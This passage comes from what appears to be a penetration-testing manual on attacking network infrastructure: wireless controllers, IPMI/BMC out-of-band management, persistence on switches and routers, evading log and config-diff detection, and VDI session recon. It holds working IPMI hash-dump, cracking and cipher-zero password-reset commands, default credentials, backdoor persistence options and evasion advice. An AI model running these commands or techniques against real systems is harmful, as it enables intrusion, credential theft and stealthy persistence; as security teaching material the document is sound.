An AP has a console port, an Ethernet uplink, and a configuration that includes the controller's address and, on some architectures, credentials or a shared key for the controller relationship. Removing an AP gives you its uplink port, which is a switch port configured to carry the AP's VLANs including, in many designs, the management VLAN. That is a physical path onto the management network from a corridor. Note that in an 802.1X-protected wired estate the AP's port may be authenticated, in which case you need to consider MAC authentication bypass, and that removing an AP is conspicuous both physically and as a device-down alert on the controller.

**What the controller configuration yields, concretely.** Run the same mining process as any other device configuration. Specific items to look for beyond the general list: the mapping of each SSID to its VLAN, which is the segmentation answer for wireless; whether the guest SSID's VLAN has any filtering, which is very often the finding; whether guest and corporate wireless share a VLAN; whether any SSID's VLAN can reach the management network; and the RADIUS configuration, which points at the same server that authenticates wired 802.1X and device administration.

**Disruption risk on a wireless controller is unusually high.** Changing a WLAN configuration, an SSID, a VLAN mapping or a radio setting disconnects every client using it, immediately and visibly, across the whole site. Rebooting a controller takes down all wireless. A controller is one of the worst devices in the estate to make an exploratory change on, because the affected population is large, mobile and vocal. Read freely; change only with agreement and a plan.

**Detection.** Controllers log administrative access and configuration changes and are usually integrated with the SIEM, more often than switches are, because wireless teams tend to have better tooling. Wireless intrusion detection is on by default in most products, which matters for the radio side. Configuration change detection on controllers is common. And the controller knows where every AP is and what every client's signal strength is, which is why radio-side activity on a dense deployment can be located to within a room.

## Out-of-Band and Lights-Out Management

### Why this is the highest-value network in the building

Out-of-band management, meaning the network that carries BMC and iLO and iDRAC traffic, serial console servers, KVM over IP, PDU management and the management interfaces of switches and storage, exists so that infrastructure can be administered when the production network or the host operating system is broken. That purpose dictates its properties, and every one of those properties is favourable to you.

It has to work when everything else does not, so it is deliberately independent, separately switched, and not dependent on production infrastructure. It exists for emergencies, so access controls that would impede an emergency get relaxed. It is rarely used day to day, so nobody notices activity on it. It is not a production network, so it is frequently excluded from vulnerability scanning, from patch management and from monitoring, on the grounds that it is internal and administrative. It is old, because BMC firmware is updated only during hardware maintenance. And it grants absolute control: a BMC is a separate computer with its own processor, memory, network stack and operating system, which has full control of the host it is attached to, including power state, boot device, console and virtual media.

**The consequence is that the out-of-band network is simultaneously the most powerful and the least defended network in most buildings.** Access to it is equivalent to physical access to every server, and physical access to a server means booting it from media you supply, which means the disk. There is no operating system control that mitigates this, because the BMC operates below the operating system.

The virtualisation material earlier in this section covers the closely related problem of reaching the hypervisor management network, and the two are usually the same network or adjacent to it. Treat that section's access techniques as applying here too: if you can reach the vSphere management network you can very likely reach the BMCs of the hosts running it, and vice versa.

### IPMI

**What it is.** The Intelligent Platform Management Interface, a specification for out-of-band server management, exposed over UDP 623 via RMCP and RMCP+, and implemented by every server vendor's BMC.

**Why its authentication is broken by design.** Two issues, and the important thing about both is that they are specification problems rather than vendor bugs, so they are not patched away.

The **RAKP hash disclosure** is the more general. IPMI 2.0's RAKP authentication exchange has the BMC send a salted HMAC over the user's password, HMAC-SHA1 or HMAC-MD5 or HMAC-SHA256 depending on the negotiated cipher suite, in RAKP message 2, before the client has proven anything. Any unauthenticated requester who names a valid username receives a crackable hash for that user's password. Because the protocol requires this to work, the mitigation is to restrict who can reach UDP 623, not to fix the exchange.

**Cipher zero** is more severe. Cipher suite 0 indicates that no authentication or integrity algorithm is to be used, and on affected implementations selecting it permits full authenticated access with any password. Not a weak password, any password. This was identified across multiple major vendors' BMCs and the remediation is to explicitly disable cipher suite 0 in the BMC configuration, which is a step that is very frequently not taken.

Add to those the practical realities: BMC default credentials survive for years because commissioning processes rarely change them, BMC firmware is rarely updated, BMC accounts are almost never centrally managed, and the same credential is typically used across every server of a given generation because it was set from a template.

**Preconditions.** UDP 623 reachable, which means being on or being able to route to the out-of-band network.

```bash
# Identify BMCs and their IPMI version.
nmap -sU -p623 --script ipmi-version -iL $TARGETS

# Cipher zero check.
nmap -sU -p623 --script ipmi-cipher-zero -iL $TARGETS
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS file:$TARGETS; run; exit"

# RAKP hash dump. Supply a username list; the module also finds
# accounts with blank passwords.
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS file:$TARGETS; set OUTPUT_HASHCAT_FILE ipmi.hashes; run; exit"

# Crack. Short numeric and vendor-default patterns first: BMC passwords
# are frequently set from a template and are frequently short.
hashcat -m 7300 ipmi.hashes wordlist.txt
hashcat -m 7350 ipmi.hashes wordlist.txt   # where HMAC-MD5 was negotiated

# Exploit cipher zero: no valid password required.
ipmitool -I lanplus -C 0 -H $TARGET -U Administrator -P '' user list
ipmitool -I lanplus -C 0 -H $TARGET -U Administrator -P '' user set password 2 NewPassword

# With any working credential, the useful operations.
ipmitool -I lanplus -H $TARGET -U $USER -P $PASS user list
ipmitool -I lanplus -H $TARGET -U $USER -P $PASS lan print
ipmitool -I lanplus -H $TARGET -U $USER -P $PASS chassis status
ipmitool -I lanplus -H $TARGET -U $USER -P $PASS chassis bootdev pxe
ipmitool -I lanplus -H $TARGET -U $USER -P $PASS sol activate
```

**What BMC access is worth.** Serial-over-LAN gives you the host's console, which on a Linux host may be a login prompt and on a misconfigured one may be a root shell, and which lets you interrupt the boot loader. Boot device control plus virtual media, available through the vendor web interface rather than IPMI proper, lets you boot the host from an image you supply, which is total compromise of the host and its disks, subject to disk encryption. Power control lets you reboot the host, which is disruptive and should be treated as such. And the BMC itself, being a Linux system with a network stack on both the management network and, on shared-NIC configurations, the production network, can be a pivot between them.

That last point deserves emphasis. Many BMCs are deployed in a shared or sideband NIC mode where the BMC shares the host's physical network interface. In that configuration the BMC is reachable from the production network, and it may also be able to reach the management network, which makes it a bridge between the two. Finding a BMC answering on a production subnet is therefore both an easier target and a more valuable one than finding one on the management network, because it is a path between networks that are supposed to be separate.

**Verify it worked.** `ipmitool ... chassis status` returning power state and `user list` returning the account table confirm authenticated access. For cipher zero, the tell is that a command succeeds with an obviously wrong password.

**Detection and opsec.** BMC logging is poor and forwarding is rare. Most BMCs maintain a small local event log, and many do not log failed authentication at all. The web interface logs administrative actions locally. Very few organisations forward BMC logs anywhere, and fewer have detections on them. This is genuinely one of the quietest places in the estate to operate, which is exactly why it is worth checking whether the client knows that. What is visible: a power state change is unmissable, because the host goes down and everything monitoring the host alerts. Mounting virtual media is logged locally by most implementations. Changing a BMC user's password is logged and, more importantly, will break the legitimate management tooling that uses that account, which generates a support ticket. Prefer adding an account over changing an existing password, and prefer using an existing credential over either.

**Failure modes.**

- No response on 623: filtered, or the BMC has IPMI over LAN disabled, which is increasingly a vendor default on newer generations in favour of Redfish. Check 443 for the web interface and the Redfish API.
- `ipmi_dumphashes` returns nothing: your username list does not contain a valid account. Try the vendor defaults for the specific hardware generation, and note that the module reports blank-password accounts separately.
- Cipher zero appears to work but commands fail: some implementations accept the cipher zero negotiation but reject the subsequent commands. Confirm with a read-only command before concluding anything.
- `ipmitool` reports `Error: Unable to establish IPMI v2 / RMCP+ session`: version or cipher suite mismatch. Try `-I lanplus` explicitly, then vary the cipher suite with `-C`.
- Authentication succeeds but privileges are insufficient: IPMI has privilege levels and the account may be USER rather than ADMINISTRATOR. `-L ADMINISTRATOR` requests a level explicitly and will fail if the account does not have it.

### Vendor implementations

Every vendor builds their own management processor on top of, or alongside, IPMI, with a web interface, a REST API and a set of proprietary tools. The IPMI weaknesses above apply where IPMI over LAN is enabled; the vendor interfaces have their own, separate surface, and modern generations increasingly disable IPMI in favour of Redfish, which is a REST API over HTTPS and which should be enumerated as an API rather than probed as IPMI.

| Implementation | Vendor | Interfaces | Notes |
| --- | --- | --- | --- |
| iDRAC | Dell | 443, 623/udp, 5900 for virtual console, Redfish | Historic default credential pair `root` / `calvin` on older generations, still found unchanged |
| iLO | HPE | 443, 623/udp, Redfish, plus proprietary ports | Default credentials are per-unit and printed on a tag, so defaults are less productive; the web interface and its history are the surface |
| XCC and IMM | Lenovo and IBM | 443, 623/udp, Redfish | Per-unit or template credentials |
| Supermicro IPMI and BMC | Supermicro | 443, 623/udp | Historically the weakest implementations, with a long history of serious issues including credential exposure |
| CIMC | Cisco UCS | 443, 623/udp | Managed via UCS Manager in fabric deployments, which is then the higher-value target |
| Redfish | Industry standard | 443 | A REST API for management. Enumerate it as an API: `/redfish/v1/` is the service root and is often readable unauthenticated |

```bash
# Redfish service root is frequently readable without authentication
# and identifies the hardware, the firmware and the available features.
curl -sk https://$TARGET/redfish/v1/ | jq .
curl -sk -u $USER:$PASS https://$TARGET/redfish/v1/Systems | jq .
curl -sk -u $USER:$PASS https://$TARGET/redfish/v1/AccountService/Accounts | jq .
```

<!-- VERIFY: which Redfish endpoints are readable unauthenticated depends on the implementation and firmware; the service root commonly is, deeper resources generally are not. Confirm per target. -->

### Console servers, KVM and infrastructure adjacent to the OOB network

Everything else on the management network is worth enumerating for the same reasons. Serial console servers, covered in the management protocol section above, give console access to every device connected to them. KVM over IP switches give keyboard, video and mouse to every attached server, sometimes with a single shared password and an ancient Java or ActiveX client that reveals the protocol. Rack PDUs let you cut power to a rack, which you will not do but which you should absolutely report. Environmental monitoring and cooling controllers are on the same network and are equally weak. Storage array management interfaces are on the management network and control the disks of everything. And the management interfaces of the network devices themselves are here, which closes the loop: the management network is the network from which every other network is administered.

The practical implication for an engagement is that reaching the out-of-band network is often a bigger result than reaching any single production system, and the sentence to write in a report is that the out-of-band network is, in effect, physical access to the data centre delivered over Ethernet.

## Persistence on Network Devices

### Configuration-based persistence

The realistic and appropriate form. Everything here is a configuration change and therefore appears in a configuration diff, which is the central trade-off: network device persistence is durable, survives reboots, is invisible to endpoint tooling, and is trivially discovered by anyone comparing the configuration to a known-good baseline.

Options, roughly in order of increasing detectability:

**An SSH public key added to an existing service account.** A small change in a part of the configuration nobody reads, and it does not create a new principal. On platforms that store authorised keys outside the main configuration, it may not appear in a configuration diff at all, which makes it the best option available. <!-- VERIFY: whether authorised keys appear in the running configuration or in a separate store is platform-specific; check for the target platform. -->

**A tunnel to infrastructure you control.** Durable, protocol-legitimate, and it gives you network access rather than just device access. Detectable by its persistent outbound flow, which is a network detection rather than a configuration one.

**A widened management access list.** One line, in a place that is reviewed, but a very small change.

**A scheduled or event-triggered script.** Several platforms have an on-box scripting or automation capability: Cisco's Embedded Event Manager, Junos event policies and on-box Python, and equivalents elsewhere. An EEM applet that runs on a timer or in response to an event can re-add your access after someone removes it, which makes it the most resilient configuration-based option. It is also a very unusual configuration element, so an engineer reading the configuration will notice it immediately, and it is specifically covered in hardening guidance.

**A new local administrative account.** The most reliable and the most detected. Discussed above.

Two things apply to all of them. First, the running configuration and the startup configuration are different, and a change made only to the running configuration disappears at the next reload while a change written to startup survives it and appears in the backup. Choose deliberately: running-only is quieter and temporary, startup is durable and shows up in the next configuration backup, which is compared against the last one. Second, whatever you add, record it precisely and remove it at the end of the engagement, because a forgotten backdoor on a core switch is a genuine security incident that you caused.

### Firmware-level persistence

This is a real category and it should be described accurately rather than either dismissed or overstated.

Network device firmware can be modified to include an implant, and this has been done in practice by well-resourced actors against multiple platforms. The mechanism is that a device's operating system image, or a bootloader, or in some cases a module loaded at runtime, is replaced or patched to include additional functionality: a backdoor authentication path, a covert channel, a packet-triggered command execution primitive. The result is persistence that survives configuration changes, survives configuration restoration from backup, survives a reload, and is invisible to any configuration diff, because the configuration is unchanged. It is the most durable persistence available anywhere in an enterprise.

It is also rare, difficult and high-consequence, for good reasons. It requires platform-specific engineering against a proprietary, undocumented image, per software version, with no margin for error, because a mistake bricks a device that may be in another country and may be carrying a site's entire traffic load. It requires either code execution at a level that permits writing the image, or the ability to make the device fetch an image you control. Modern platforms increasingly implement secure boot and runtime image integrity verification, which raises the cost substantially where it is enabled, and vendors ship integrity verification tooling that incident responders use. And the consequences of discovery are severe, both because the artefact is unambiguous and because it establishes an intent that a configuration change does not.

For a penetration test, the practical position is: do not do this. The demonstration value over configuration-based persistence is minimal, the risk of bricking production infrastructure is unacceptable, and the effort is disproportionate. What is worth doing is assessing whether the client could detect or prevent it, which means checking whether secure boot and image verification are enabled, whether image hashes are verified against vendor values on upgrade, whether the TFTP and firmware distribution path is authenticated, and whether anybody would notice an image being replaced. Those are findings, and they are better findings than an implant.

## Detection and Opsec

### Where device logs go, and what that means

Network devices generate syslog and send it to a collector, and the interesting question is what happens to it after that. There are three common states and they imply very different levels of risk to you.

**Syslog to a local buffer only.** The device keeps a circular buffer in memory. It is lost on reload, it is visible only to someone who logs in and looks, and nothing alerts. This is common on access switches and on out-of-band and environmental kit, and it means your activity is effectively unobserved unless somebody investigates.

**Syslog forwarded to a collector, unanalysed.** The logs are in a Splunk or Elastic index or a syslog server's filesystem. Nobody has written detections. Your activity is recorded and discoverable during an investigation but does not generate an alert. This is the most common state in mid-sized estates and it is the one to plan around: assume you will be found in the logs afterwards, and assume you will not be caught in real time.

**Syslog forwarded and analysed, with detections.** Rarer, and usually limited to a specific set: authentication failures, configuration changes, interface state changes, and device reachability. Where this exists it is usually because a compliance requirement drove it, which tells you which device classes are covered: the ones in scope for the compliance regime, typically the firewalls and the devices bounding the regulated network, and not the access switches.

Layered on top of syslog are three other sources that matter more than syslog does.

**TACACS+ accounting**, which records every authentication and, where command accounting is enabled, every command typed on every device, centrally. This is the highest-fidelity telemetry in the network layer by a wide margin and it is the one to worry about. If the estate runs TACACS+ with command accounting, assume a complete transcript of your device activity exists.

**Configuration backup and diff**, discussed below, which is the most reliably deployed detection of all.

**Flow data**, NetFlow, sFlow or IPFIX, exported by the devices themselves to a collector. Flow data does not show you content but it shows every conversation, and it is very good at exactly the things device attacks generate: a switch initiating TFTP to a workstation, a new persistent GRE tunnel to an unusual destination, a management session from an unexpected source, a burst of SNMP from a single host to every device in the estate. Flow-based detection is the reason SNMP sweeps and configuration exfiltration are riskier than their lack of device logging suggests.

### Configuration change detection is the one to plan around

This is the single most important operational point in this section, and it is the one most often missed.

Organisations that monitor nothing else about their network devices frequently do monitor configuration changes, because configuration backup is an operational necessity rather than a security control. Something backs up every device's configuration nightly, because engineers need to restore a device after a hardware failure, and once you have nightly backups a diff is nearly free. So there is a scheduled job comparing today's configuration to yesterday's, and it produces a report, and somebody reads it, or at least somebody would read it if it were unusual. Products in this space, SolarWinds NCM, Rancid, Oxidized, Unimus and the vendor platforms, all do this as a core feature and most of them alert on it by default.

The consequences for how you work are direct. Reading a configuration produces no diff and is therefore invisible to the most reliable detection in the network layer. Every change you make will appear in the next diff, with the exact lines, attributed to a time window. Small changes are as visible as large ones, because a diff shows one line as clearly as fifty. Reverting a change does not remove the first diff, it adds a second one, and a change followed by a revert is a more suspicious pattern than a change that stays. A change made to the running configuration but not written to startup may escape a backup job that collects the startup configuration, which is a real and useful distinction on platforms that separate them, and it is worth checking which one the backup job collects.

The practical conclusion: **read freely, change rarely and deliberately, and assume every change is seen.** That is not a reason to avoid changes, because demonstrating that you can reconfigure the network is often the point of the engagement. It is a reason to plan the change, make it once, record it, and not use the device as a scratchpad.

### The visibility of authentication failures

Failed logins to network devices are unusually visible for three reasons. They are one of the few things that device syslog reliably records and that detections are reliably written for. Where AAA is centralised, every failure across the entire fleet arrives at one place, so a spray that would be invisible if it were distributed becomes a single obvious cluster. And network devices have very low baseline authentication volume: a switch might see two logins a week, so twenty failures is not a small increase in noise, it is an event with no precedent.

This inverts the usual guidance. On a Windows estate, a slow password spray hides in a large volume of legitimate authentication. On a network device fleet there is no volume to hide in. The correct approach is therefore not "spray slowly" but "do not spray at all until you have a credential you have good reason to believe is valid". Get credentials from configurations, from configuration archives, from the management platform, from a Git repository, from a wiki page, from a captured TACACS+ session. Then use them. Guessing against network devices is loud, unproductive because the accounts are usually not local, and risks locking out the management plane.

The exception, and it is a real one, is the single-credential fleet-wide spray discussed earlier: one attempt per device, using a credential you already have, is one login event per device and it is the natural shape of legitimate administration.

### Disruption risk, stated plainly

The rest of this part is about detection. This subsection is about harm, and on network devices harm is the larger risk.

**Reading is safe.** Retrieving a configuration, walking SNMP, reading a routing table, enumerating a management interface: none of these can take a site offline. Do all of it, early and thoroughly. A full-tree SNMP walk against a heavily loaded core device on old hardware is the only read operation with any meaningful load implication, and even that is a management-plane concern rather than a forwarding-plane one.

**Changing can take a site offline, and the blast radius is not proportional to the size of the change.** One line in an access control list can stop an application. One static route can blackhole a subnet. One interface command can drop a building. One spanning tree change can cause a broadcast storm that takes down a whole layer 2 domain. One change to a first-hop redundancy protocol can leave a VLAN with no gateway, which is why the On-Path and Traffic Attacks section treats HSRP and VRRP as a safety gate rather than an opportunity. The asymmetry between the effort of the change and the size of the consequence is larger here than anywhere else in an engagement.

**Anything touching routing, access control lists, interface state, spanning tree or redundancy protocols needs agreement first.** Not a note in the report afterwards, agreement in advance, from someone empowered to accept the risk, with a named contact who can respond if it goes wrong and a documented revert. This is not a caveat, it is an operational requirement, because the alternative is that you cause an outage you cannot fix and cannot explain.

**A device reload to recover from your own mistake is a visible outage and it is worse than the mistake.** This is the failure mode to internalise. You apply a bad ACL to the VTY lines, you lose your session, and you cannot get back in. The only remaining options are console access, which you probably do not have, or a reload, which reverts to the startup configuration and also drops every link on the device for a minute or more. Every port goes down. Every user on that switch loses their session. Monitoring alerts fire. Someone opens an incident. And the device's uptime counter resets, which is a permanent and conspicuous record of exactly when it happened. On a stack or a chassis the reload takes considerably longer, and on a device that is a spanning tree root or an active gateway it triggers a topology reconvergence that affects other devices too.

The defences against this are cheap and you should use all of them. Save the original configuration before you touch anything. Arm a timed reload or a timed configuration rollback before making a change that could cut off your access, and cancel it once you have confirmed you are still connected. Never apply an ACL to a management interface or a VTY line without your own source address in it. Make one change at a time and verify after each. And keep a second session open to the device while you work, because a change that breaks new sessions often leaves existing ones alive long enough to fix it.

### Your own opsec, condensed

- Prefer reads to writes, always. Almost everything valuable in this section is a read.
- Prefer the configuration archive and the management platform to the devices. One target, no device touched, and the whole fleet.
- Prefer credentials found to credentials guessed. Device fleets have no authentication noise to hide in.
- Spray one credential across many devices rather than many credentials at one device.
- Source your traffic from something that looks like management infrastructure where you can. A management session from a management jump host is invisible; the same session from a workstation subnet is not.
- Take configurations once. Repeated extraction of the same configuration is a pattern.
- Do not leave SNMP copy table rows, monitor sessions, tunnels, accounts or ACL entries behind. Keep a written list from the first change and check it off.
- Assume TACACS+ command accounting exists until you have confirmed it does not, because if it does, everything you typed is recorded.
- Treat the out-of-band network as the quietest place available and the production management VLAN as moderately watched.
- Never touch environmental, power or industrial control devices beyond enumeration.

## Summary Table

| Device class | Likely management route | Highest-value yield | Disruption risk |
| --- | --- | --- | --- |
| Access switch | SSH or Telnet with fleet credentials, SNMP read | Configuration: fleet credentials, AAA shared secret, VLAN and trunk topology | Low to read. High if you touch interfaces, VLANs or spanning tree |
| Distribution or core switch | SSH with fleet credentials, SNMP | ARP and route tables for the whole site, SPAN capture position, ACLs enforcing segmentation | Low to read. Severe to change: this device carries the site |
| Router | SSH, SNMP, NETCONF | Full routing topology, every peer and site, VPN pre-shared keys, WAN edge ACLs | Low to read. Severe to change: routing errors propagate |
| Firewall | HTTPS management UI or API, SSH, central manager | Complete rule base, LDAP bind service account, VPN PSKs and peer inventory, certificates | Low to read. High to change: rule base changes affect everything |
| VPN concentrator or SSL VPN | HTTPS portal and management, pre-auth vulnerability classes | Live session material, domain service account, client certificate CA key, remote access foothold | Low to read. Severe to reload: every remote worker disconnects |
| Load balancer or reverse proxy | Management UI or REST API, SSH, then root on the underlying OS | TLS private keys including wildcards, complete backend inventory, embedded credentials, JWT signing keys | Low to read. Severe to change: it fronts production applications |
| Wireless controller | HTTPS UI, SSH, SNMP, or the cloud tenancy | Every SSID's PSK, RADIUS secrets, SSID to VLAN mapping, AP inventory | Low to read. Severe to change: disconnects every client at the site |
| Access point | Physical removal, console, or via the controller | Controller address and relationship credentials, and the uplink switch port | Moderate: one AP's coverage, plus a device-down alert |
| BMC, iLO, iDRAC, XCC | IPMI on 623/udp, vendor HTTPS, Redfish | Host console, boot device and virtual media, meaning total control of the server | Low to read. Severe to power-cycle |
| Console or terminal server | SSH or Telnet, often default credentials | Console access to every attached device, therefore administrative access to all of them | Low to read. Severe if you use password recovery, which requires a reload |
| Management platform (NCM, Panorama, FortiManager, ISE, ClearPass, Central) | HTTPS UI or API, or the host OS | Every device configuration, every device credential, full change history: the entire fleet | Low to read. Severe to push a change: it changes many devices at once |
| TACACS+ or RADIUS server | Host compromise, or a captured session and a cracked shared secret | The shared secret for every device, the authorisation policy, the accounting transcript, an AD service account | Low to read. Severe if you disrupt it: every device loses authentication |
| Configuration archive (TFTP, FTP, Git, share) | Often unauthenticated or weakly authenticated | Every device configuration and its history, with no device touched | None to read. Severe to write: firmware and config supply chain |
| Printer or MFD | HTTPS UI, SNMP, port 9100 | LDAP bind credentials from the address book | Low |
| UPS, PDU, environmental controller | HTTP UI with default credentials, SNMP | Presence on the management network, and power control you will not use | Catastrophic if misused. Enumerate only |


## Virtual Desktop Infrastructure and Published Application Breakout

A client hands you a Citrix icon, a `.rdp` file, or a browser tab containing a Windows desktop, and says "that is your foothold". Third-party access, contractor access, offshore development access and privileged administrative access are all commonly delivered exactly this way, which means an increasing share of engagements begin inside a deliberately restricted session rather than on a laptop you control. Everything in the rest of this document assumes you can run arbitrary code somewhere. This part is about getting to that point, and about the fact that once you get there you are standing on a machine full of other people's credentials.

The material divides cleanly into two objectives that are worth keeping separate in your head. The first is **breakout**: you have been given a constrained interface, perhaps a single published application, and you need arbitrary code execution in your own session. The second is **shared-host exploitation**: a session host is a multi-user Windows server, so once you have code execution you are on a machine that concurrently holds the tokens, tickets, DPAPI keys and browser sessions of everyone else logged into it, frequently including administrators. The second objective is why this environment is so productive and it is the part most treatments skip.

Application control bypass proper, meaning AppLocker, WDAC and PowerShell Constrained Language Mode, is covered in depth in the Windows Post-Exploitation section and is not repeated here. The distinction to hold onto is that this part deals with the **delivery platform's** restrictions, which are largely enforced by the shell and by the platform's own policy layer, while application control is enforced by the kernel. They fail differently and they are bypassed differently, and conflating them is the most common reason an operator wastes an afternoon.

### What a session host actually is

A **session host** is an ordinary Windows machine that has been configured to accept multiple simultaneous interactive logons and to project the resulting desktops or windows to remote clients over a display protocol. In the Microsoft world that role is Remote Desktop Session Host, in the Citrix world the machine runs a multi-session **Virtual Delivery Agent** (VDA), in Omnissa Horizon it runs the Horizon Agent, in Azure Virtual Desktop it runs the AVD agent. The display protocol differs (RDP, Citrix HDX over ICA, Blast Extreme or PCoIP) but the operating system underneath is the same Windows you already know how to attack.

The consequences of multi-user follow directly from that.

Every user logged into the host has a session with its own session ID, its own desktop and window station, its own set of processes, and its own logon session in LSA. Their processes hold their tokens. LSASS holds credential material for all of them. Their Kerberos tickets are in the machine's ticket cache, keyed by logon session. Their DPAPI master keys are decrypted in memory while they are logged on. Their profile is mounted on the local disk or as a mounted container. If any of them is a domain administrator, or a service desk operator with delegated rights, or a database administrator with a stored connection, that material is on the machine you are standing on and one local administrator compromise away.

Single-session VDI (one virtual machine per user, the classic "virtual desktop") does not have this property and is correspondingly much less interesting once you are inside. Multi-session hosts, which is what published applications almost always run on and what pooled Windows Server or Windows multi-session desktops are, do. Work out which you are on early, because it changes where you spend your time. `qwinsta` answering with a single session on a Windows client SKU means single-session VDI. Multiple sessions on a Windows Server SKU or on Windows 10/11 Enterprise multi-session means you are sharing.

### Published desktop versus published application

A **published desktop** gives you a full Windows shell, normally `explorer.exe`, and the restrictions are whatever group policy, application control and platform policy impose on top of it. This is the easier starting position because you have a file manager, a Start menu, a taskbar and the whole shell namespace, and the fight is with policy rather than with the absence of an interface.

A **published application** gives you one application's windows projected into your local desktop, with no visible remote shell. Under the bonnet the session still has a full desktop; it simply has your application as the session's initial program instead of `explorer.exe`. Nothing has been removed from the operating system. There is still a `cmd.exe` in `System32`, still a full shell namespace, still every LOLBin on the box. What you lack is a launcher. Almost every breakout technique in this part is a way of obtaining a launcher.

This is the single most important mental model for published application breakout: **you are not missing capabilities, you are missing a way to invoke them.** Anything in the session that will start a process, resolve a shell path, open a context menu, evaluate a script, or write a file to a location something else reads, is a candidate launcher.

On the Microsoft side, RemoteApp is implemented by setting the RDP session's `alternate shell` to the published program instead of `explorer.exe`, and the session host validates the requested program against an allow list. On the Citrix side the ICA file's `InitialProgram` names the published resource and the VDA launches it as the session's initial program. Same idea, different plumbing, and in both cases the allow-list enforcement on the server is the thing that stops you asking for `cmd.exe` instead.

### Non-persistent versus persistent

**Persistent** desktops are assigned to a user and keep their disk between logons. They behave like a normal workstation for persistence purposes.

**Non-persistent** desktops are built from a golden image, assigned from a pool at logon, and destroyed or reset on logoff. Citrix builds these with Machine Creation Services from a master image snapshot, or with Citrix Provisioning streaming a read-only vDisk to a write cache. Horizon builds them as instant clones from a golden image. AVD pooled host pools are typically built from a custom image in an Azure Compute Gallery. In all cases the local disk is disposable and anything you write to it dies.

That has two consequences worth internalising immediately. Your artefacts are ephemeral, which is convenient for you and inconvenient for a responder. And host-based persistence is pointless, so persistence has to move either into the identity (the account, its credentials, a certificate, a ticket, a token) or into the image (the golden image, the vDisk, the provisioning pipeline) or into the profile layer (which persists by design). That is developed properly further down.

Recognising non-persistence from inside: check uptime against your own logon time, because a freshly provisioned machine will have booted minutes before you arrived. Machine names generated by a provisioning pattern with a numeric or random suffix are a tell. The presence of a Citrix Provisioning write cache, or a small system drive with a separate large write-cache volume, is a tell. An `Instant Clone` computer account naming pattern in Horizon is a tell.

```powershell
# Boot time versus your logon time: a gap of minutes means you got a fresh clone.
(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
(Get-CimInstance Win32_ComputerSystem) | Select-Object Name, Domain, Manufacturer, Model, TotalPhysicalMemory
quser
```

`Manufacturer` and `Model` also tell you the hypervisor, which feeds directly into the virtualisation material earlier in this section.

### The profile management layer

Because the disk is disposable and the host is shared, every one of these platforms bolts on a profile layer that carries the user's settings and data between hosts and between logons. The three you will meet are **FSLogix** (Microsoft, profile containers as VHD or VHDX files on an SMB share, used by AVD and very widely by Citrix and Horizon too), **Citrix Profile Management** (also called UPM, a file-based roaming profile store with configurable inclusion and exclusion lists), and **Omnissa Dynamic Environment Manager** (formerly VMware User Environment Manager, a settings-capture approach).

The profile layer matters to you for four reasons, and it is worth being explicit about all of them because operators routinely notice only the first.

It is where the user's data actually lives, including browser profiles, saved credentials, DPAPI-protected blobs, `NTUSER.DAT` and everything under `AppData`. On a non-persistent host that is the only durable user storage.

It is a persistence location that survives host reset by design. A shortcut in the profile's Startup folder, or a `Run` key value in the profile's `NTUSER.DAT`, executes on every subsequent logon on every subsequent host.

It is a **cross-user** attack surface. Containers and profile directories live on a file share. If share and NTFS permissions are wrong, or if you compromise the file server, or if you are simply an administrator of the storage, you can write into another user's profile and get execution as them the next time they log on. That is a lateral movement primitive that requires no credential theft at all.

It is a bulk credential source. Every user's DPAPI-protected material, browser cookie stores and token caches sit in one directory tree. With the domain DPAPI backup key you decrypt all of them offline. See the Windows Post-Exploitation section for the DPAPI mechanics, the domain DPAPI backup key, and browser cookie and token extraction.

FSLogix configuration lives at `HKLM\SOFTWARE\FSLogix\Profiles`, where `VHDLocations` is the UNC path of the container share and `Enabled` gates the feature. Read that key first thing on any AVD or FSLogix-backed host: it hands you the share path.

```powershell
reg query "HKLM\SOFTWARE\FSLogix\Profiles" /s
reg query "HKLM\SOFTWARE\FSLogix\ODFC" /s   # Office container settings, if in use
Get-Service frxsvc, frxccds -ErrorAction SilentlyContinue
```

Citrix Profile Management's effective configuration is delivered through Citrix policy and mirrored into the registry under the Citrix policy tree; the store path is the item you want. `Get-Service ctxProfile` and the presence of `UserProfileManager.exe` confirm it is running. <!-- VERIFY exact service name and registry path for Citrix Profile Management store configuration -->

### Reconnaissance from inside a restricted session

Do this before trying breakout techniques at random. Restricted-session recon answers five questions, and the answers tell you which breakout family will work rather than making you brute-force all of them.

#### What am I, and what kind of session is this

```cmd
whoami /all
hostname
set
qwinsta
quser
systeminfo
```

`whoami /all` gives you the account, its SID, its group memberships and, critically, its **privileges**. On a session host, note whether you hold `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (you will not as a normal interactive user, but a published application running as a service account is a different story), and whether you are in any local group beyond `Users` and `Remote Desktop Users`.

The environment block is the cheapest platform fingerprint available. `%SESSIONNAME%` is `Console` on a local console, `RDP-Tcp#<n>` for an RDP or RemoteApp session, and an ICA-derived value in a Citrix session. `%CLIENTNAME%` is set to the client device's name in both RDS and ICA sessions, and its presence proves you are in a remote session rather than at a console. `%HOMESHARE%`, `%APPDATA%` and `%USERPROFILE%` tell you whether the profile is local, redirected or container-mounted.

```cmd
echo %SESSIONNAME% %CLIENTNAME%
echo %USERPROFILE% %APPDATA% %HOMESHARE%
```

#### Which platform delivers this

Fingerprint by installed agent. The agent is on the session host, it is not hidden, and it names the platform and version precisely.

| Platform | Agent evidence on the session host |
| --- | --- |
| Citrix Virtual Apps and Desktops / DaaS | `C:\Program Files\Citrix\` tree, `HKLM\SOFTWARE\Citrix`, VDA services including the Citrix Desktop Service and the Citrix ICA service, `BrokerAgent.exe` |
| Remote Desktop Services | `TermService` running, `rdpclip.exe` in session, `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server` |
| Azure Virtual Desktop | `C:\Program Files\Microsoft RDInfra\`, `RDAgentBootLoader` service, `HKLM\SOFTWARE\Microsoft\RDInfraAgent` <!-- VERIFY exact RDInfraAgent registry key name and the value holding the host pool name and broker URL --> |
| Omnissa Horizon | Horizon Agent under `C:\Program Files\Omnissa\Horizon\Agent\` on current builds, `C:\Program Files\VMware\VMware View\Agent\` on older ones |
| FSLogix profile layer | `frxsvc` service, `C:\Program Files\FSLogix\Apps\` |
| Citrix Workspace Environment Management | WEM agent service and agent cache directory <!-- VERIFY WEM agent service name --> |

```powershell
